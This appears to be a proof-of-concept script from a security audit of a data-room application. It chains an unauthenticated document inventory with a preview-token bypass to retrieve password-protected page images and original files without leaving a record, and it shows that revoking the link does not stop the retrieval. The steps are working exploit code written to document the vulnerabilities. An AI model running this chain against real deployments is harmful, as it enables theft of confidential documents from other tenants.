#!/usr/bin/env python3
"""CHAIN B — PM-19 -> PM-01. One free account, no bidder address, no Q&A.

An attacker holding a GENERAL-audience data room link inventories the room before
the password (PM-19), then mints a preview token for a link it does not own (PM-01)
and pulls page images — and, on a GENERAL link, the original uploaded files — for
every document it named, leaving no record. Revocation does not close the
page-image route.

The GENERAL link is forced active for the baseline and its state restored in
`finally`; the V6 revocation stage archives and un-archives it with the seller
cookie.

    docker exec -e PYTHONPATH=/opt/poc-deps pm-audit-app \
        python3 /app/security-review/chain-b-inventory-then-preview-bypass/poc.py
"""
import re
import sys
import pathlib

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parents[1] / "_poc"))
from pmpoc import (  # noqa: E402
    BASE, db, db_close, get, post, put, as_json, mint_cookie, link_data,
    fetch_bytes, table_counts, count_delta, VULN, CONTROL, OBSERVE, SKIP, log, summary,
)


def versions(raw):
    return sorted(set(re.findall(r'"versions":\[\{"id":"([^"]+)"', raw)))


# ---- discover a GENERAL (password) link and a GROUP link for the same room ----
gen = db("""
  select l.id, l."dataroomId" room, l."teamId" team
  from "Link" l
  where l."linkType"='DATAROOM_LINK' and l."audienceType"='GENERAL'
    and l.password is not null and l."dataroomId" is not null
    and exists (select 1 from "Link" g where g."dataroomId"=l."dataroomId"
                and g."audienceType"='GROUP')
  limit 1
""")[0]
GENERAL, ROOM, TEAM = gen["id"], gen["room"], gen["team"]
GROUP = db('select id from "Link" where "dataroomId"=$1 and "audienceType"=\'GROUP\' limit 1',
           [ROOM])[0]["id"]
COOKIE = mint_cookie("mallory@attacker.test")
# The seller is an ADMIN of the GENERAL link's own team (whichever room was found).
_seller = db('select u.email from "User" u join "UserTeam" ut on ut."userId"=u.id '
             "where ut.\"teamId\"=$1 and ut.role='ADMIN' limit 1", [TEAM])
SELLER = mint_cookie(_seller[0]["email"]) if _seller else None

row = db('select "isArchived","expiresAt","deletedAt" from "Link" where id=$1', [GENERAL])[0]
SNAP = (row["isArchived"], row["expiresAt"], row["deletedAt"])


def pages(token, ver):
    s, t, _ = post("/api/views/pages",
                   {"previewToken": token, "linkId": GENERAL, "documentVersionId": ver,
                    "pageNumbers": [1]}, COOKIE)
    b = as_json(t)
    return s, (b.get("pages") or [{}])[0].get("file")


def run():
    log(f"CHAIN B — preview-token page exfiltration   base={BASE}")
    log(f"  general link={GENERAL}  group link={GROUP}  room={ROOM}")
    log("")

    # ---- C0: the attacker is a stranger to the seller's tenant --------------
    me = as_json(get("/api/auth/session", COOKIE)[1])
    docs = get(f"/api/teams/{TEAM}/documents", COOKIE)[0]
    rooms = get(f"/api/teams/{TEAM}/datarooms", COOKIE)[0]
    CONTROL("the attacker is refused the seller's documents", docs in (401, 403), f"HTTP {docs}")
    CONTROL("the attacker is refused the seller's datarooms", rooms in (401, 403), f"HTTP {rooms}")
    memberships = db('select "teamId" from "UserTeam" where "userId"=$1', [me.get("user", {}).get("id")]) \
        if me.get("user") else []
    CONTROL("the attacker holds no membership in the seller's team",
            all(m["teamId"] != TEAM for m in memberships))

    # ---- C1: the link's own gate genuinely refuses entry --------------------
    gate = post("/api/views-dataroom", {
        "linkId": GENERAL, "dataroomId": ROOM, "email": "outsider@not-invited.test",
        "userId": None, "linkType": "DATAROOM_LINK", "viewType": "DATAROOM_VIEW",
        "hasConfirmedAgreement": False,
    })
    gate_msg = str(as_json(gate[1]).get("message", ""))
    CONTROL("the gate rejects entry (password required)",
            gate[0] >= 400 and "password" in gate_msg.lower(), f"HTTP {gate[0]} {gate_msg[:40]!r}")

    # ---- D1 (PM-19): inventory the room before the password -----------------
    g_status, g_text, _ = link_data(GENERAL)
    gen_versions = versions(g_text)
    VULN("the room's inventory is disclosed anonymously, before the password",
         g_status == 200 and len(gen_versions) > 0, f"{len(gen_versions)} version id(s)")

    # ---- C3: the GROUP link is correctly filtered --------------------------
    grp_versions = versions(link_data(GROUP)[1])
    cross = [v for v in gen_versions if v not in grp_versions]
    CONTROL("the GROUP link withholds at least one document the GENERAL link discloses",
            len(cross) > 0, f"{len(cross)} withheld")

    # ---- V1 (PM-01): mint a preview token for a link the attacker does not own
    m_status, m_text, _ = post(f"/api/links/{GENERAL}/preview", {}, COOKIE)
    token = as_json(m_text).get("previewToken")
    VULN("a preview token is issued for another tenant's link",
         m_status == 200 and bool(token), f"HTTP {m_status}")

    # ---- V2/V3: open the room and pull pages, measuring what it records ------
    before = table_counts()
    v2 = post("/api/views-dataroom", {
        "linkId": GENERAL, "dataroomId": ROOM, "previewToken": token, "userId": None,
        "linkType": "DATAROOM_LINK", "viewType": "DATAROOM_VIEW",
    }, COOKIE)
    VULN("the token opens the room without the password or an invited email",
         v2[0] == 200, f"HTTP {v2[0]}")
    pulled = []
    for ver in gen_versions:
        s, url = pages(token, ver)
        pulled.append((ver, ver in cross, s, url))
    got_cross = [p for p in pulled if p[1] and p[2] == 200 and p[3]]
    VULN("page images are served for a document the group link withholds",
         len(got_cross) > 0, f"{len(got_cross)}/{len(cross)} cross-group document(s)")
    after = table_counts()
    delta = count_delta(before, after)

    # ---- V4: fetch the bytes ------------------------------------------------
    shot = got_cross[0] if got_cross else next((p for p in pulled if p[2] == 200 and p[3]), None)
    if shot:
        b_status, byts = fetch_bytes(shot[3])
        VULN("the withheld document's rendered bytes are retrieved",
             b_status == 200 and len(byts) > 0, f"{len(byts)} bytes")
    else:
        SKIP("byte retrieval", "no page URL was returned")

    # ---- V5: no trace -------------------------------------------------------
    view_cols = db("select column_name from information_schema.columns where table_name='View'")
    has_preview = any(c["column_name"].lower() == "ispreview" for c in view_cols)
    VULN("the entire sequence is recorded nowhere",
         len(delta) == 0 and not has_preview,
         "0 row changes, no isPreview column" if not delta else str(delta))

    # ---- C4 (PM-01 on GENERAL): the ORIGINAL file is served ------------------
    target = cross[0] if cross else gen_versions[0]
    tdoc = db('select "documentId" from "DocumentVersion" where id=$1', [target])
    did = tdoc[0]["documentId"] if tdoc else None
    c4 = post("/api/views-dataroom", {
        "linkId": GENERAL, "dataroomId": ROOM, "previewToken": token, "userId": None,
        "linkType": "DATAROOM_LINK", "viewType": "DOCUMENT_VIEW",
        "documentVersionId": target, "documentId": did,
    }, COOKIE)
    orig_url = as_json(c4[1]).get("file")
    is_original = bool(orig_url) and not re.search(r"page-\d+\.(jpg|png)", orig_url)
    VULN("on a GENERAL link the ORIGINAL uploaded file is served, not just a page image",
         c4[0] == 200 and is_original, (orig_url or f"HTTP {c4[0]}")[:70])
    if orig_url and is_original:
        ob_status, ob = fetch_bytes(orig_url)
        VULN("the original file's bytes are retrieved with no password",
             ob_status == 200 and len(ob) > 0, f"{len(ob)} bytes")

    # ---- C5: bulk download refuses a preview token -------------------------
    c5 = post("/api/links/download/dataroom-document",
              {"linkId": GENERAL, "previewToken": token, "dataroomId": ROOM}, COOKIE)
    CONTROL("bulk document download refuses a preview token", c5[0] in (401, 403), f"HTTP {c5[0]}")

    # ---- V6: revocation does not close the page-image route -----------------
    arch = put(f"/api/links/{GENERAL}/archive", {"isArchived": True, "teamId": TEAM}, SELLER)
    if arch[0] == 200:
        room2 = post("/api/views-dataroom", {
            "linkId": GENERAL, "dataroomId": ROOM, "previewToken": token, "userId": None,
            "linkType": "DATAROOM_LINK", "viewType": "DATAROOM_VIEW",
        }, COOKIE)
        page2 = pages(token, shot[0])[0] if shot else None
        CONTROL("archival does close room entry (front door)", room2[0] == 404, f"HTTP {room2[0]}")
        VULN("archival does NOT close the page-image route",
             page2 == 200, f"views/pages still HTTP {page2}")
        put(f"/api/links/{GENERAL}/archive", {"isArchived": False, "teamId": TEAM}, SELLER)
    else:
        SKIP("revocation", f"seller archive request returned HTTP {arch[0]}")


db('update "Link" set "isArchived"=false, "expiresAt"=null, "deletedAt"=null where id=$1', [GENERAL])
try:
    run()
finally:
    db('update "Link" set "isArchived"=$2, "expiresAt"=$3, "deletedAt"=$4 where id=$1',
       [GENERAL, SNAP[0], SNAP[1], SNAP[2]])
    log("")
    log("  cleanup: GENERAL link archive/expiry/delete state restored")

summary("CHAIN B — inventory then preview-token bypass")
db_close()
